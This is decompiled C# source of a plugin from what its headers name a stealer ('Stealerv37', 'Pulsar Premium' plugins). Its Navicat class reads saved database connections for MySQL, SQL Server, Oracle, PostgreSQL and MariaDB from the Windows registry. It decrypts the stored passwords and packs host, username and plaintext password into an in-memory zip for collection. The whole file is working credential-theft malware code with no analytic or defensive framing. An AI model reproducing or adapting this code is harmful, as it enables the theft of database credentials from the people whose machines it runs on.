// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.Navicat
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Text;

#nullable disable
namespace Intelix.Targets.Applications;

public class Navicat : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    Dictionary<string, string> dictionary = new Dictionary<string, string>()
    {
      [nameof (Navicat)] = "MySql",
      ["NavicatMSSQL"] = "SQL Server",
      ["NavicatOra"] = "Oracle",
      ["NavicatPG"] = "pgsql",
      ["NavicatMARIADB"] = "MariaDB"
    };
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (Navicat);
    Navicat11Cipher navicat11Cipher = new Navicat11Cipher();
    foreach (string key in dictionary.Keys)
    {
      string name = $"Software\\PremiumSoft\\{key}\\Servers";
      RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey(name);
      if (registryKey1 != null)
      {
        string str1 = dictionary[key];
        foreach (string subKeyName in registryKey1.GetSubKeyNames())
        {
          RegistryKey registryKey2 = registryKey1.OpenSubKey(subKeyName);
          if (registryKey2 != null)
          {
            object obj1 = registryKey2.GetValue("Host");
            object obj2 = registryKey2.GetValue("UserName");
            object obj3 = registryKey2.GetValue("Pwd");
            string str2 = obj1.ToString();
            string str3 = obj2.ToString();
            string ciphertext = obj3.ToString();
            string str4 = navicat11Cipher.DecryptString(ciphertext);
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.AppendLine("DatabaseType: " + str1);
            stringBuilder.AppendLine("ConnectName: " + subKeyName);
            stringBuilder.AppendLine("Host: " + str2);
            stringBuilder.AppendLine("UserName: " + str3);
            stringBuilder.AppendLine("Password: " + str4);
            string entryPath = $"Navicat\\{str1}\\{subKeyName}\\connection.txt";
            zip.AddTextFile(entryPath, stringBuilder.ToString());
            counterApplications.Files.Add($"{name}\\{subKeyName} => {entryPath}");
          }
        }
      }
    }
    if (counterApplications.Files.Count <= 0)
      return;
    counter.Applications.Add(counterApplications);
  }
}
